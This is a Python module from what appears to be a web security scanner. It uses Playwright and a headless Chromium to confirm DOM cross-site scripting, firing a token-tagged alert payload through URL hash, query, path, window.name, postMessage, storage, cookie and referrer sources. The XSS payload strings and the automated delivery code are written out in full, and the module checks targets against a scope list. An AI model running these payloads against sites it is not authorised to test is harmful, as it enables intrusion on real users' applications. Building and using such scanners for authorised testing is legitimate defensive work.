"""World 1-4, the real proof: confirm DOM XSS in a live headless browser.

Static leads and reflections are only guesses. This module drives a real
Chromium (through Playwright) and feeds a one-off token payload through every
common DOM XSS source. It only says CONFIRMED when a real alert/confirm/prompt
runs with our token, so there is no false "reflection equals execution".

Sources it tries, one by one:
  hash            url#payload
  query           ?param=payload
  path            /payload at the end of the path
  window.name     set window.name, then open the page
  postMessage     open the page, then post the payload to it
  localStorage    seed common keys, then reload
  sessionStorage  seed common keys, then reload
  cookie          set a cookie to the payload, then open the page
  referrer        arrive with the payload sitting in the referrer

Playwright is optional. Without it, this stage prints one friendly line telling
you how to turn it on, and nothing is faked.
"""
import json
from urllib.parse import parse_qsl, quote, urlencode, urlparse

from . import core

try:
    from playwright.sync_api import TimeoutError as PWTimeout
    from playwright.sync_api import sync_playwright
    HAVE_PW = True
except ImportError:
    HAVE_PW = False

# Common param / key / cookie names a DOM sink might read.
COMMON_KEYS = ["q", "search", "id", "name", "msg", "message", "text", "input",
               "data", "value", "redirect", "url", "next", "return", "lang",
               "view", "page", "ref", "token", "user"]


def available():
    return HAVE_PW


def _token(url):
    import hashlib
    return "WZ" + hashlib.md5(url.encode()).hexdigest()[:8]


def _payloads(token):
    """A small, strong set that calls alert(token) across HTML and JS contexts."""
    a = "alert('%s')" % token
    return [
        "<img src=x onerror=%s>" % a,
        "<svg onload=%s>" % a,
        "\"><img src=x onerror=%s>" % a,
        "'><svg onload=%s>" % a,
        "</script><img src=x onerror=%s>" % a,
        "javascript:%s" % a,
        "';%s;//" % a,
        "\";%s;//" % a,
    ]


def _set_param(url, param, value):
    p = urlparse(url)
    q = [(k, v) for k, v in parse_qsl(p.query, keep_blank_values=True) if k != param]
    q.append((param, value))
    return p._replace(query=urlencode(q)).geturl()


def run(urls, scope, hud, limit=15, timeout=15):
    """Confirm DOM XSS on in-scope URLs. Returns a list of confirmed hits."""
    if not HAVE_PW:
        hud.note("browser confirm skipped: install playwright, then run "
                 "'playwright install chromium' to turn it on")
        return []

    targets = [u for u in urls if core.in_scope(urlparse(u).hostname, scope)][:limit]
    if not targets:
        hud.note("browser confirm: no in-scope URLs to try")
        return []

    confirmed = []
    ms = max(2000, int(timeout) * 1000)
    with sync_playwright() as pw:
        browser = pw.chromium.launch(headless=True)
        try:
            for url in targets:
                confirmed.extend(_check_url(browser, url, ms, hud))
        finally:
            browser.close()
    return confirmed


def _check_url(browser, url, ms, hud):
    token = _token(url)
    payloads = _payloads(token)
    base = url.split("#")[0]
    params = [k for k, _ in parse_qsl(urlparse(url).query)] or []
    try_params = list(dict.fromkeys(params + COMMON_KEYS))[:6]

    hits = []
    fired = {"msg": None}

    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()

    def on_dialog(dialog):
        fired["msg"] = dialog.message
        try:
            dialog.dismiss()
        except Exception:
            pass

    page.on("dialog", on_dialog)

    def fired_token():
        return bool(fired["msg"]) and token in (fired["msg"] or "")

    def attempt(label, deliver):
        """Run one delivery closure; record a hit if the token fires."""
        for pay in payloads:
            fired["msg"] = None
            try:
                deliver(pay)
            except (PWTimeout, Exception):
                pass
            if fired_token():
                hits.append({"url": base, "source": label, "payload": pay,
                             "token": token, "verdict": "CONFIRMED"})
                return True
        return False

    # --- hash --------------------------------------------------------------
    def d_hash(pay):
        page.goto(base + "#" + pay, wait_until="load", timeout=ms)
        page.evaluate("() => window.dispatchEvent(new HashChangeEvent('hashchange'))")
        page.wait_for_timeout(150)
    attempt("hash", d_hash)

    # --- query -------------------------------------------------------------
    for param in try_params:
        if attempt("query:" + param,
                   lambda pay, p=param: (page.goto(_set_param(base, p, pay),
                                                    wait_until="load", timeout=ms),
                                         page.wait_for_timeout(150))):
            break

    # --- path --------------------------------------------------------------
    def d_path(pay):
        page.goto(base.rstrip("/") + "/" + quote(pay, safe=""),
                  wait_until="load", timeout=ms)
        page.wait_for_timeout(120)
    attempt("path", d_path)

    # --- window.name -------------------------------------------------------
    def d_name(pay):
        page.goto("about:blank", timeout=ms)
        page.evaluate("n => { window.name = n; }", pay)
        page.goto(base, wait_until="load", timeout=ms)
        page.wait_for_timeout(120)
    attempt("window.name", d_name)

    # --- postMessage -------------------------------------------------------
    def d_postmessage(pay):
        page.goto(base, wait_until="load", timeout=ms)
        page.evaluate("p => window.postMessage(p, '*')", pay)
        page.evaluate("p => window.postMessage({data:p, message:p, html:p}, '*')", pay)
        page.wait_for_timeout(150)
    attempt("postMessage", d_postmessage)

    # --- localStorage / sessionStorage -------------------------------------
    def _seed_storage(store, pay):
        page.goto(base, wait_until="load", timeout=ms)
        page.evaluate(
            "([s, keys, v]) => { const o = s==='local'?localStorage:sessionStorage;"
            "keys.forEach(k => { try { o.setItem(k, v); } catch(e){} }); }",
            [store, COMMON_KEYS, pay])
        page.reload(wait_until="load", timeout=ms)
        page.wait_for_timeout(120)
    attempt("localStorage", lambda pay: _seed_storage("local", pay))
    attempt("sessionStorage", lambda pay: _seed_storage("session", pay))

    # --- cookie ------------------------------------------------------------
    def d_cookie(pay):
        try:
            context.clear_cookies()
        except Exception:
            pass
        cookies = [{"name": k, "value": pay, "url": base} for k in COMMON_KEYS[:6]]
        try:
            context.add_cookies(cookies)
        except Exception:
            return
        page.goto(base, wait_until="load", timeout=ms)
        page.wait_for_timeout(120)
    attempt("cookie", d_cookie)

    # --- referrer ----------------------------------------------------------
    def d_referrer(pay):
        ref = base + "?wzref=" + quote(pay, safe="")
        page.goto(base, wait_until="load", timeout=ms, referer=ref)
        page.wait_for_timeout(120)
    attempt("referrer", d_referrer)

    try:
        context.close()
    except Exception:
        pass
    return hits


def write(outdir, confirmed):
    (outdir / "confirmed_xss.json").write_text(
        json.dumps(confirmed, indent=2), encoding="utf-8")
